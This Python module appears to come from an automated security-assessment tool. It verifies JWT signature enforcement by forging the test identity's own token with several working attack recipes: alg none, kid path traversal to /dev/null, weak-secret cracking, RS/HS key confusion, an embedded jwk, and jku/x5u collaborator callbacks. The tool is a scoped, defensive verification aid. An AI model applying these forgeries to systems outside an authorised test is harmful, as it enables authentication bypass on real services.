"""Bounded JWT signature-enforcement proof for one registered test identity.

The identity's own token is the only token ever modified. The probe adds a
nonce claim to its payload and re-encodes it two ways:

* ``alg_none``: header ``{"alg":"none"}`` and an empty signature;
* ``bad_signature``: the original header with the original signature, which no
  longer matches the changed payload;
* ``kid_null``: HS256 with ``kid`` pointing at ``/dev/null`` and an empty key;
* ``weak_secret``: only when an HS256 signature matches a short public list of
  default secrets, checked offline (no target traffic while guessing);
* ``rs_hs_confusion``: an RS256 token re-signed as HS256 with the server's own
  public key from an in-scope JWKS document;
* ``embedded_jwk``: RS256 signed with a throwaway key generated for this run,
  whose public half is embedded in the header (``jwk``). A server that trusts
  the header's key accepts it.

Confirmed only when, on the same observed endpoint:

* the valid token is accepted (2xx);
* no token and a malformed token are both rejected (401/403), so auth runs
  before anything else (layer ordering);
* a forged token is accepted (2xx) with the same stable body as the valid
  token, while the rejected controls differ from it (body-diff).

Nothing escalates privileges or changes the subject; the claim is only that the
server does not verify token integrity. The model supplies no token bytes.
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
from urllib.error import HTTPError
from urllib.request import Request, build_opener

from app.services.agent.assessment_proxy import assessment_urllib_handlers

from .browser import assert_in_scope
from .http_observe import _NoRedirect, _cookie_header

MAX_BODY = 256 * 1024
JWT_RE = re.compile(r"^[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*$")
RECIPES = ("alg_none", "bad_signature", "kid_null", "weak_secret", "rs_hs_confusion",
           "embedded_jwk")
# A small, public list of default/demo HMAC secrets. Checked offline against the
# identity's own token signature; nothing is sent to the target while guessing.
WEAK_SECRETS = (
    "secret", "secretkey", "secret_key", "your-256-bit-secret", "your-secret-key",
    "changeme", "change-me", "password", "123456", "jwt", "jwt_secret", "jwtsecret",
    "key", "test", "default", "admin", "supersecret", "s3cr3t", "mysecret", "token",
)
KID_NULL_PATH = "../../../../../../../../dev/null"
_JWKS_PATH = re.compile(r"(?i)(?:jwks|/\.well-known/(?:jwks|openid)|/keys/?$|/certs/?$)")
_VOLATILE = re.compile(rb"[A-Za-z0-9+/=_-]{16,}")
_DIGITS = re.compile(rb"\d+")


def _b64decode(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def _b64encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _stable_digest(body: bytes) -> str:
    return hashlib.sha256(_DIGITS.sub(b"0", _VOLATILE.sub(b"", body))).hexdigest()[:16]


def locate_token(session: dict) -> tuple[str, str, str]:
    """Return ``(where, name, token)`` for the identity's JWT, or raise."""
    for key, value in (session.get("headers") or {}).items():
        text = str(value or "")
        if str(key).lower() == "authorization" and text.lower().startswith("bearer "):
            token = text.split(None, 1)[1].strip()
            if JWT_RE.match(token):
                return "header", str(key), token
    for cookie in session.get("cookies") or []:
        value = str(cookie.get("value") or "")
        if JWT_RE.match(value):
            return "cookie", str(cookie.get("name") or ""), value
    raise ValueError("The test identity has no JWT bearer header or cookie")


def _hmac(key: bytes, signing_input: str) -> str:
    import hmac

    return _b64encode(hmac.new(key, signing_input.encode(), hashlib.sha256).digest())


def _decode(token: str) -> tuple[str, str, str, dict, dict]:
    try:
        header_b64, payload_b64, signature = token.split(".")
        header = json.loads(_b64decode(header_b64))
        payload = json.loads(_b64decode(payload_b64))
    except (ValueError, TypeError) as exc:
        raise ValueError("The identity token is not a decodable JWT") from exc
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("The identity token is not a JSON object JWT")
    return header_b64, payload_b64, signature, header, payload


def crack_weak_secret(token: str) -> bytes | None:
    """Offline: return a listed secret that reproduces the token's HS256 signature."""
    header_b64, payload_b64, signature, header, _ = _decode(token)
    if str(header.get("alg") or "").upper() != "HS256":
        return None
    for candidate in WEAK_SECRETS:
        if _hmac(candidate.encode(), f"{header_b64}.{payload_b64}") == signature:
            return candidate.encode()
    return None


def jwk_to_pem(jwks: dict, kid: str | None) -> bytes | None:
    """Public key PEM for the token's RSA ``kid`` (or the only RSA key)."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

    keys = [k for k in (jwks.get("keys") or []) if isinstance(k, dict) and k.get("kty") == "RSA"]
    chosen = [k for k in keys if kid and k.get("kid") == kid] or (keys if len(keys) == 1 else [])
    if not chosen:
        return None
    key = chosen[0]
    try:
        n = int.from_bytes(_b64decode(str(key["n"])), "big")
        e = int.from_bytes(_b64decode(str(key["e"])), "big")
    except (KeyError, ValueError):
        return None
    public = RSAPublicNumbers(e, n).public_key()
    return public.public_bytes(serialization.Encoding.PEM,
                               serialization.PublicFormat.SubjectPublicKeyInfo)


def forge(token: str, recipe: str, nonce: str, *, public_pem: bytes | None = None) -> str | None:
    """Re-encode the identity's token with a nonce claim; ``None`` if not applicable."""
    header_b64, _payload_b64, signature, header, payload = _decode(token)
    payload = {**payload, "prowl_nonce": nonce}
    body = _b64encode(json.dumps(payload, separators=(",", ":")).encode())

    def header_with(**changes) -> str:
        return _b64encode(json.dumps({**header, **changes}, separators=(",", ":")).encode())

    if recipe == "alg_none":
        return f"{_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())}.{body}."
    if recipe == "bad_signature":
        return f"{header_b64}.{body}.{signature}"
    if recipe == "kid_null":
        # A server that reads the HMAC key from a path named by ``kid`` reads
        # an empty file and verifies a signature made with an empty key.
        forged_header = header_with(alg="HS256", kid=KID_NULL_PATH)
        return f"{forged_header}.{body}.{_hmac(b'', f'{forged_header}.{body}')}"
    if recipe == "weak_secret":
        secret = crack_weak_secret(token)
        if secret is None:
            return None
        return f"{header_b64}.{body}.{_hmac(secret, f'{header_b64}.{body}')}"
    if recipe == "rs_hs_confusion":
        if not public_pem or str(header.get("alg") or "").upper() not in {"RS256", "RS384", "RS512"}:
            return None
        forged_header = header_with(alg="HS256")
        return f"{forged_header}.{body}.{_hmac(public_pem, f'{forged_header}.{body}')}"
    if recipe == "embedded_jwk":
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding, rsa

        throwaway = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        numbers = throwaway.public_key().public_numbers()

        def b64int(value: int) -> str:
            return _b64encode(value.to_bytes((value.bit_length() + 7) // 8, "big"))

        jwk = {"kty": "RSA", "kid": f"prowl-{nonce}", "e": b64int(numbers.e), "n": b64int(numbers.n)}
        forged_header = header_with(alg="RS256", jwk=jwk, kid=jwk["kid"])
        signing_input = f"{forged_header}.{body}".encode()
        signed = throwaway.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
        return f"{forged_header}.{body}.{_b64encode(signed)}"
    raise ValueError("Unsupported JWT recipe")


def fetch_jwks(url: str, *, allowed_origin: str) -> dict:
    """Read a public, in-scope JWKS document (no credentials sent)."""
    from urllib.parse import urlsplit

    assert_in_scope(url, [allowed_origin])
    if not _JWKS_PATH.search(urlsplit(url).path or ""):
        raise ValueError("jwks_url must be a JWKS or OpenID keys endpoint")
    opener = build_opener(*assessment_urllib_handlers(), _NoRedirect())
    with opener.open(Request(url, headers={"Accept": "application/json"}, method="GET"),
                     timeout=20) as response:
        data = json.loads(response.read(MAX_BODY))
    if not isinstance(data, dict):
        raise ValueError("JWKS document is not a JSON object")
    return data


def _request(url: str, *, allowed_origin: str, session: dict, where: str, name: str,
             token: str | None) -> tuple[int, bytes]:
    assert_in_scope(url, [allowed_origin])
    headers = {"Accept": "application/json, text/html;q=0.9, */*;q=0.8"}
    for key, value in (session.get("headers") or {}).items():
        if str(key).lower() not in {"authorization", "cookie", "host"}:
            headers[str(key)] = str(value)
    cookies = []
    state = {"cookies": [c for c in session.get("cookies") or []
                         if not (where == "cookie" and c.get("name") == name)]}
    base = _cookie_header(state, url)
    if base:
        cookies.append(base)
    if token is not None:
        if where == "header":
            headers[name] = f"Bearer {token}"
        else:
            cookies.append(f"{name}={token}")
    if cookies:
        headers["Cookie"] = "; ".join(cookies)
    opener = build_opener(*assessment_urllib_handlers(), _NoRedirect())
    try:
        response = opener.open(Request(url, headers=headers, method="GET"), timeout=20)
    except HTTPError as error:
        response = error
    with response:
        return int(response.status or 0), response.read(MAX_BODY)


def probe_jwt(url: str, *, allowed_origin: str, session: dict, nonce: str,
              recipes: tuple[str, ...] = RECIPES, send=_request,
              public_pem: bytes | None = None) -> dict:
    if not nonce or len(nonce) < 8 or len(nonce) > 40 or not nonce.isalnum():
        raise ValueError("A random alphanumeric nonce of at least 8 characters is required")
    where, name, token = locate_token(session)

    def observe(value):
        status, body = send(url, allowed_origin=allowed_origin, session=session,
                            where=where, name=name, token=value)
        return {"status": status, "sha256": _stable_digest(body), "length": len(body)}

    valid = observe(token)
    unauthenticated = observe(None)
    malformed = observe("prowl." + nonce + ".invalid")
    requests_sent = 3
    gated = (200 <= valid["status"] < 300 and unauthenticated["status"] in {401, 403}
             and malformed["status"] in {401, 403})
    probes, hit = [], ""
    if gated:
        for recipe in recipes:
            forged = forge(token, recipe, nonce, public_pem=public_pem)
            if forged is None:
                continue
            row = {"recipe": recipe, **observe(forged)}
            requests_sent += 1
            row["signal"] = bool(200 <= row["status"] < 300 and row["sha256"] == valid["sha256"])
            probes.append(row)
            if row["signal"]:
                hit = recipe
                break
    confirmed = bool(hit and valid["sha256"] != unauthenticated["sha256"])
    return {
        "operation": "scoped_jwt_probe", "test_type": "jwt", "credential_location": where,
        "requests_sent": requests_sent, "valid": valid,
        "control": {"signal": False, "unauthenticated": unauthenticated, "malformed": malformed,
                    "sha256": unauthenticated["sha256"]},
        "auth_enforced": gated, "probes": probes, "recipe": hit,
        "public_key_used": bool(public_pem and hit == "rs_hs_confusion"),
        "proof_confirmed": confirmed, "finding": False,
    }


def jwt_proof_valid(row: dict) -> bool:
    if not isinstance(row, dict) or row.get("operation") != "scoped_jwt_probe":
        return False
    control = row.get("control") or {}
    valid = row.get("valid") or {}
    hit = next((p for p in row.get("probes") or []
                if isinstance(p, dict) and p.get("recipe") == row.get("recipe")), None)
    return bool(
        row.get("proof_confirmed") is True and row.get("auth_enforced") is True
        and row.get("recipe") in RECIPES and hit and hit.get("signal") is True
        and 200 <= int(valid.get("status") or 0) < 300
        and (control.get("unauthenticated") or {}).get("status") in {401, 403}
        and (control.get("malformed") or {}).get("status") in {401, 403}
        and hit.get("sha256") == valid.get("sha256") != control.get("sha256")
        and len(str(row.get("nonce") or "")) >= 8
    )


def jwt_pair_valid(first: dict, second: dict) -> bool:
    """Hunter and verifier receipts agree on recipe and token location."""
    return bool(
        jwt_proof_valid(first) and jwt_proof_valid(second)
        and first.get("recipe") == second.get("recipe")
        and first.get("credential_location") == second.get("credential_location")
    )


# --- Key-URL headers (jku / x5u) ------------------------------------------------

KEY_URL_HEADERS = ("jku", "x5u")


def forge_key_url(token: str, header_name: str, key_url: str, nonce: str) -> str:
    """The identity's token with ``jku``/``x5u`` pointing at a fresh collaborator.

    The signature is left as-is (it no longer matches); the proof is that the
    server fetches the attacker-supplied key URL at all.
    """
    if header_name not in KEY_URL_HEADERS:
        raise ValueError("Unsupported key URL header")
    header_b64, _payload_b64, signature, header, payload = _decode(token)
    forged_header = _b64encode(json.dumps({**header, header_name: key_url},
                                          separators=(",", ":")).encode())
    body = _b64encode(json.dumps({**payload, "prowl_nonce": nonce},
                                 separators=(",", ":")).encode())
    return f"{forged_header}.{body}.{signature}"


def probe_jwt_key_url(url: str, *, allowed_origin: str, session: dict, nonce: str,
                      header_name: str, register, poll, stop, send=_request,
                      poll_attempts: int = 4, sleep=None) -> dict:
    """Prove the server dereferences an attacker-supplied ``jku``/``x5u`` URL.

    A freshly registered collaborator URL goes into the token header; an HTTP
    interaction carrying that registration's id after the request is the
    signal. DNS alone is not enough (a resolver may look up any hostname).
    """
    import time

    if not nonce or len(nonce) < 8 or len(nonce) > 40 or not nonce.isalnum():
        raise ValueError("A random alphanumeric nonce of at least 8 characters is required")
    where, name, token = locate_token(session)
    unauthenticated = send(url, allowed_origin=allowed_origin, session=session,
                           where=where, name=name, token=None)
    if unauthenticated[0] not in {401, 403}:
        return {"operation": "scoped_jwt_probe", "test_type": "jwt", "recipe": "",
                "key_url_header": header_name, "auth_enforced": False,
                "proof_confirmed": False, "finding": False, "requests_sent": 1}
    registration = register()
    if not registration.get("success"):
        raise ValueError("Callback registration failed")
    session_id = str(registration.get("session_id") or "")
    domain = str(registration.get("payload_domain") or "").lower()
    payload_url = str(registration.get("payload_url") or "")
    if not session_id or not domain or not payload_url:
        raise ValueError("Callback registration returned no domain")
    key_url = payload_url.rstrip("/") + f"/{header_name}-{nonce}.json"
    interactions = []
    try:
        status, _body = send(url, allowed_origin=allowed_origin, session=session,
                             where=where, name=name,
                             token=forge_key_url(token, header_name, key_url, nonce))
        unique = domain.split(".")[0]
        for attempt in range(max(1, min(poll_attempts, 8))):
            if attempt:
                (sleep or time.sleep)(2.0)
            polled = poll(session_id) or {}
            interactions = [
                {"protocol": str(row.get("protocol") or "").lower(),
                 "matches": unique in str(row.get("unique_id") or "")}
                for row in (polled.get("interactions") or []) if isinstance(row, dict)
            ]
            if any(row["protocol"] == "http" and row["matches"] for row in interactions):
                break
    finally:
        stop(session_id)
    fetched = any(row["protocol"] == "http" and row["matches"] for row in interactions)
    return {
        "operation": "scoped_jwt_probe", "test_type": "jwt",
        "recipe": f"{header_name}_fetch" if fetched else "",
        "key_url_header": header_name, "callback_domain": domain,
        "key_url_host_matches": key_url.split("/")[2].lower().endswith(domain),
        "auth_enforced": True, "forged_status": status,
        "control": {"signal": False, "unauthenticated": {"status": unauthenticated[0]}},
        "interactions": interactions[:10], "requests_sent": 2,
        "proof_confirmed": bool(fetched), "finding": False,
    }


def jwt_key_url_proof_valid(row: dict) -> bool:
    return bool(
        isinstance(row, dict) and row.get("operation") == "scoped_jwt_probe"
        and row.get("proof_confirmed") is True
        and row.get("key_url_header") in KEY_URL_HEADERS
        and row.get("recipe") == f"{row.get('key_url_header')}_fetch"
        and row.get("auth_enforced") is True
        and row.get("key_url_host_matches") is True
        and (row.get("control") or {}).get("unauthenticated", {}).get("status") in {401, 403}
        and any(i.get("protocol") == "http" and i.get("matches") for i in row.get("interactions") or [])
        and len(str(row.get("nonce") or "")) >= 8
    )


def jwt_key_url_pair_valid(first: dict, second: dict) -> bool:
    """Each actor registered its own collaborator and saw its own fetch."""
    return bool(
        jwt_key_url_proof_valid(first) and jwt_key_url_proof_valid(second)
        and first.get("key_url_header") == second.get("key_url_header")
        and first.get("callback_domain") != second.get("callback_domain")
    )
